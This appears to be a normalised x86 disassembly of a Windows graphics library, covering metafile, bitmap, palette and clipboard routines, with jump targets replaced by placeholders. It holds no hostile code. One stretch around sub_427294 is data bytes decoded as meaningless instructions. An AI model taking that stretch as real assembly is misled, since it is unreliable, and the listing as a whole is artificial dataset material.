push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_4240bc
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ba6
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4027ac
retn
call sub_4240bc
sub_426bb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426c57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_426c35
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408798
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c5a8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c3c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_426c90
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_426ee4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422128
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_4240bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_426d20
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4268cc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426d94
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426d94
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_426d94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_4268cc
pop esi
pop ebx
retn
mov eax ebx
call sub_426ee4
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426dd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_4268cc
pop esi
pop ebx
retn
mov eax ebx
call sub_426ee4
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426e10
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4268cc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426dd0
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426dd0
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_426e84
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41bddc
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_426ee4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_4268cc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_42764c
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_427648
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_426f68
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41bddc
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_427074
mov edx ebx
mov eax esi
call sub_426fe8
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_426fe8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40278c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027ac
retn
sub_427074
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c30
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41c040
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427196
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027ac
retn
call sub_42411c
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_424f0c
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4271af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_40278c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42718f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_4271bc
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4268cc
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_42408c
sub_427240
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_427294
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x42 ] dh
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
add [ eax + eax ] ah
add al ch
sbb [ edx ] al
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x24004274 ] dl
test al 0x41
call sub_41a19c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423c68
test al al
je r-xdata
jae r-xdata
rcl [ ebp + 0x68 ] 0xca
jae r-xdata
jbe r-xdata
popad
outsb
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4273a2
push [ fs : eax ]
inc eax
add ah bl
jb r-xdata
ror [ eax ] 0x73
inc edx
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
xor eax eax
pop edx
xor [ ecx ] al
add [ eax ] al
add [ edi + edi * 8 + 0x30 ] ah
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273d1
xor [ eax ] eax
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jae r-xdata
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
mov [ ebp - 0x4 ] eax
inc edx
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax - 0x59 ] al
add [ eax + ebp * 4 ] ah
inc ecx
inc ecx
add [ eax ] ch
aas
inc edx
add [ edi + edi ] dl
inc edx
add [ ebp + esi * 2 + 0x42 ] bl
add [ 0x74694254 ] cl
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
jb r-xdata
rcl [ ebp + 0x68 ] 0xa2
jae r-xdata
jae r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423cc4
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4273ca
push [ fs : eax ]
mov eax [ rw-data ]
call sub_41a56c
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4274bc
add [ edi + edi * 8 + 0x30 ] ah
insd
popad
jo r-xdata
or eax 0x74694254
jb r-xdata
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ecx + ebx + 0x42 ] dl
sub_42732c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4273ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273d1
mov eax [ rw-data ]
call sub_41a56c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4273a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4274bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423cc4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a19c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423c68
test al al
je r-xdata
sub_4273d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a508
mov esi eax
xor ecx ecx
push ebp
push sub_427448
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
mov edx ebx
mov eax esi
call sub_41a19c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4274bc
sub_427454
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4237d4
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_427490
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_4274bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423898
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4274bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423ad8
xor edx edx
push ebp
push sub_427550
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423e4c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a51c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423cc4
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_42755c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423ad8
xor eax eax
push ebp
push sub_42763b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428878
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4273d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428978
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423e4c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423cc4
retn
sub_42764c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_40321c
sub_42766c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4273d8
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4276c8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422128
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4273d8
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4273d8
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_427714
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_424958
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4277c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4277d0
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_42781c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4273d8
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_4241c4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4241c4
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_427e6a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_40278c
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_427b74
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_4240a4
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_4241c4
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_4241c4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4241c4
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_4241c4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_427e1b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_427e0a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_427de8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_4241c4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
